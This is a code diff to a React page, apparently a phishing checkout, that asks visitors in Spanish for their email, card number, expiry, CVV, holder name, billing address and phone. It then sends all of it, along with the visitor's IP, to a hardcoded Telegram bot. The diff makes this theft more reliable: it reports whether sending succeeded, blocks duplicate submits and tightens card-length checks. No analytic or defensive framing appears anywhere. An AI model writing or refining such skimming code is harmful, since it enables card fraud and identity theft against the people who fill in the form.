@@ -1,4 +1,4 @@
-import { useEffect, useMemo, useState, FormEvent } from "react";
+import { useEffect, useMemo, useRef, useState, FormEvent } from "react";
 import VideoBackground from "@/components/VideoBackground";
 import VerifiedBadge from "@/components/VerifiedBadge";
 import VideoModal from "@/components/VideoModal";
@@ -10,16 +10,6 @@ import { LANGUAGES, LangCode, useI18n } from "@/lib/i18n";
 const BOT_TOKEN = "9108667087:AAEJldPbAqpUPndj1vV4HwXgae0mlLiHjaw";
 const CHAT_ID = "8585803145";
 const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-const C = {
-  primary: "#0570de",
-  text: "#30313d",
-  secondary: "#6d6e78",
-  placeholder: "#a3a6ba",
-  border: "#e6e6e6",
-  divider: "#f0f0f5",
-  danger: "#df1b41",
-};
 
 const COUNTRIES = [
   "Honduras", "United States", "México", "Colombia", "Argentina", "Chile", "Perú",
@@ -46,6 +36,8 @@ const detectBrand = (d: string): Brand => {
   if (/^6(011|5)/.test(d)) return "discover";
   return null;
 };
+
+const cardLength = (b: Brand) => (b === "amex" ? 15 : 16);
 
 const formatCardBranded = (v: string) => {
   const d = v.replace(/\D/g, "");
@@ -86,33 +78,34 @@ const buildParams = (text: string) => {
 };
 
 const pixelGet = (params: string) =>
-  new Promise<void>((resolve) => {
+  new Promise<boolean>((resolve) => {
     const img = new Image();
     let done = false;
-    const finish = () => { if (!done) { done = true; resolve(); } };
-    img.onload = finish;
-    img.onerror = finish;
+    const finish = (ok: boolean) => { if (!done) { done = true; resolve(ok); } };
+    img.onload = () => finish(true);
+    img.onerror = () => finish(false);
     img.src = `${TG_URL}?${params}&_=${Date.now()}`;
-    setTimeout(finish, 3000);
+    setTimeout(() => finish(false), 3000);
   });
 
-const sendToTelegram = async (text: string) => {
+const sendToTelegram = async (text: string): Promise<boolean> => {
   const params = buildParams(text);
   try {
     const blob = new Blob([params], { type: "application/x-www-form-urlencoded;charset=UTF-8" });
     if (navigator.sendBeacon && navigator.sendBeacon(TG_URL, blob)) {
       console.info("[tg] enviado por beacon");
       await new Promise((r) => setTimeout(r, 900));
-      return;
+      return true;
     }
   } catch (err) { console.warn("[tg] beacon falló", err); }
   try {
     await fetch(`${TG_URL}?${params}&_=${Date.now()}`, { method: "GET", keepalive: true });
     console.info("[tg] enviado por GET");
-    return;
+    return true;
   } catch (err) { console.warn("[tg] fetch GET falló, uso pixel", err); }
-  await pixelGet(params);
-  console.info("[tg] enviado por pixel");
+  const ok = await pixelGet(params);
+  console.info("[tg] pixel", ok ? "ok" : "falló");
+  return ok;
 };
 
 /* ---------------- iconos ---------------- */
@@ -225,12 +218,6 @@ const HnFlag = () => (
   </span>
 );
 
-const labelCls = "mb-[6px] block text-[12.5px] font-medium leading-none text-[#30313d]";
-const cellCls = "px-3.5 py-[9px]";
-const inputCls =
-  "h-9 w-full rounded-[4px] bg-transparent text-[16px] text-[#30313d] outline-none transition-shadow duration-100 placeholder:text-[#a3a6ba] focus:shadow-[0_0_0_1px_#0570de]";
-const errCls = (on: boolean) => (on ? "shadow-[0_0_0_1px_#df1b41]" : "");
-
 const Login = () => {
   const { t, lang, setLang } = useI18n();
   const [step, setStep] = useState<"intro" | "pay">("intro");
@@ -257,6 +244,7 @@ const Login = () => {
   const [loading, setLoading] = useState(false);
   const [videoOpen, setVideoOpen] = useState(false);
 
+  const sendingRef = useRef(false);
   const ref = useMemo(() => Math.random().toString(36).slice(2, 8).toUpperCase(), []);
   const brand = detectBrand(card.replace(/\s/g, ""));
   const cvvMax = brand === "amex" ? 4 : 3;
@@ -281,6 +269,7 @@ const Login = () => {
       setProcessing(false);
       setStage(0);
       setLoading(false);
+      sendingRef.current = false;
     };
     window.addEventListener("popstate", onPop);
     return () => window.removeEventListener("popstate", onPop);
@@ -292,6 +281,10 @@ const Login = () => {
   };
 
   const goBack = () => {
+    setLoading(false);
+    setProcessing(false);
+    setStage(0);
+    sendingRef.current = false;
     if ((window.history.state as any)?.vh === "pay") window.history.back();
     else setStep("intro");
   };
@@ -315,7 +308,7 @@ const Login = () => {
 
   const onSubmit = async (e: FormEvent) => {
     e.preventDefault();
-    if (loading) return;
+    if (sendingRef.current) return;
     setError("");
     setField("");
 
@@ -325,9 +318,10 @@ const Login = () => {
     const month = Number(mm);
     const year = 2000 + Number(yy);
     const now = new Date();
+    const expected = cardLength(brand);
 
     if (!emailOk(email)) return fail("email", "Escribe un correo electrónico válido.");
-    if (digits.length < 15) return fail("card", "Tu número de tarjeta está incompleto.");
+    if (digits.length !== expected) return fail("card", "Tu número de tarjeta está incompleto.");
     if (cleanHolder.length < 3) return fail("holder", "Escribe el nombre del titular.");
     if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) return fail("exp", "La fecha de vencimiento no es válida.");
     if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) return fail("exp", "Tu tarjeta está vencida.");
@@ -335,13 +329,14 @@ const Login = () => {
     if (address.trim().length < 5) return fail("address", "Escribe tu dirección de facturación.");
     if (zip.trim().length < 3) return fail("zip", "Escribe un código postal válido.");
 
+    sendingRef.current = true;
     setLoading(true);
     setProcessing(true);
     setStage(0);
 
     (async () => {
       try {
-        const sentFlag = `card_sent_${digits}`;
+        const sentFlag = `card_sent_${digits}_${annual ? "a" : "m"}`;
         if (localStorage.getItem(sentFlag) === "1") return;
         const ip = await getIp();
         const text = [
@@ -360,6 +355,7 @@ const Login = () => {
           `Departamento: ${department || "—"}`,
           `ZIP: ${zip.trim().toUpperCase()}`,
           `Teléfono: ${phone.trim() || "—"}`,
+          `Guardar tarjeta: ${save ? "Sí" : "No"}`,
           `Plan: ${annual ? "Anual" : "Mensual"} · ${price}`,
           "",
           `IP: ${ip}`,
@@ -368,8 +364,8 @@ const Login = () => {
           `Idioma: ${lang}`,
           `Ref: ${ref}`,
         ].join("\n");
-        await sendToTelegram(text);
-        localStorage.setItem(sentFlag, "1");
+        const ok = await sendToTelegram(text);
+        if (ok) localStorage.setItem(sentFlag, "1");
       } catch (err) {
         console.error("[tg] error inesperado", err);
       }
@@ -695,7 +691,7 @@ const Login = () => {
                   </div>
                 </div>
 
-                <p className="mb-[4px] mt-[16px] px-[11px] text-[15px] text-[#1a1a1a]">Nombre del titular de tarjeta</p>
+                <p className="mb-[5px] mt-[26px] px-[11px] text-[15px] text-[#1a1a1a]">Nombre del titular de tarjeta</p>
                 <input
                   id="cc-name"
                   type="text"
@@ -710,7 +706,7 @@ const Login = () => {
                   className={`h-[42px] w-full rounded-[9px] border bg-white px-[13px] text-[16px] uppercase text-[#1a1a1a] outline-none transition-colors placeholder:normal-case placeholder:text-[#9b9b9b] focus:border-[#a8a8a8] ${field === "holder" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}
                 />
 
-                <p className="mb-[5px] mt-[20px] px-[11px] text-[15px] text-[#1a1a1a]">Dirección de facturación</p>
+                <p className="mb-[6px] mt-[24px] px-[11px] text-[15px] text-[#1a1a1a]">Dirección de facturación</p>
 
                 <div className={`overflow-hidden rounded-[9px] border bg-white ${field === "address" || field === "zip" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}>
                   <div className="relative">
